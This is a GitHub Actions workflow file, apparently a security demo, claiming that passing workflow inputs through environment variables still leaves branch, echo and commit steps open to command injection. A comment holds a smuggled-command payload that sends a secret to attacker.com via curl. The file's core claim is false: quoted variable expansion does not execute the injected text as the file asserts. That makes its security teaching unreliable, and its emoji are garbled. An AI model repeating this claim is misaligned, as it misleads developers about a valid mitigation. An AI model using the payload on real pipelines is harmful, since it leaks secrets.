name: "INEFFECTIVE FIX: Using Environment Variables"

# ‚ö†Ô∏è WARNING: This is the "fix" that was attempted but STILL VULNERABLE
# This demonstrates why moving to env vars alone doesn't solve the problem

on:
  workflow_dispatch:
    inputs:
      package_name:
        description: 'Package name to update'
        required: true
        type: string
      package_version:
        description: 'Package version'
        required: true
        type: string

jobs:
  ineffective-fix:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up fake secret (for demonstration)
        run: |
          echo "DEMO_SECRET=super-secret-api-key-12345" >> $GITHUB_ENV
          echo "DEMO_AWS_KEY=AKIAIOSFODNN7EXAMPLE" >> $GITHUB_ENV

      - name: Configure Git (INEFFECTIVE FIX)
        run: |
          git config user.name "$ACTOR"
          git config user.email "$ACTOR@users.noreply.github.com"
        env:
          ACTOR: ${{ github.actor }}
        # ‚ö†Ô∏è STILL VULNERABLE: Shell still expands $ACTOR which contains untrusted data

      - name: Create Branch (INEFFECTIVE FIX)
        run: |
          git checkout -b "update-${PACKAGE_NAME}-${PACKAGE_VERSION}"
        env:
          PACKAGE_NAME: ${{ inputs.package_name }}
          PACKAGE_VERSION: ${{ inputs.package_version }}
        # ‚ö†Ô∏è STILL VULNERABLE: ${PACKAGE_NAME} expands in the shell
        # Attack: package_name = 'foo"; curl https://attacker.com?secret=$DEMO_SECRET #'
        # Result: git checkout -b "update-foo"; curl https://attacker.com?secret=$DEMO_SECRET #-version"

      - name: Update package info (INEFFECTIVE FIX)
        run: |
          echo "Updating package: ${PACKAGE_NAME}"
          echo "To version: ${PACKAGE_VERSION}"
        env:
          PACKAGE_NAME: ${{ inputs.package_name }}
          PACKAGE_VERSION: ${{ inputs.package_version }}
        # ‚ö†Ô∏è STILL VULNERABLE: Echo with untrusted data in env vars

      - name: Simulate package update (INEFFECTIVE FIX)
        run: |
          echo "Running: npm install ${PACKAGE_NAME}@${PACKAGE_VERSION}"
        env:
          PACKAGE_NAME: ${{ inputs.package_name }}
          PACKAGE_VERSION: ${{ inputs.package_version }}
        # ‚ö†Ô∏è STILL VULNERABLE: Same injection risk

      - name: Create commit (INEFFECTIVE FIX)
        run: |
          git add -A
          git commit -m "Update ${PACKAGE_NAME} to ${PACKAGE_VERSION}"
        env:
          PACKAGE_NAME: ${{ inputs.package_name }}
          PACKAGE_VERSION: ${{ inputs.package_version }}
        # ‚ö†Ô∏è STILL VULNERABLE: Commit message injection

      - name: Summary
        run: |
          echo "‚úÖ Package ${PACKAGE_NAME} updated to ${PACKAGE_VERSION}"
          echo "üîí Demo secrets are available: $DEMO_SECRET"
        env:
          PACKAGE_NAME: ${{ inputs.package_name }}
          PACKAGE_VERSION: ${{ inputs.package_version }}
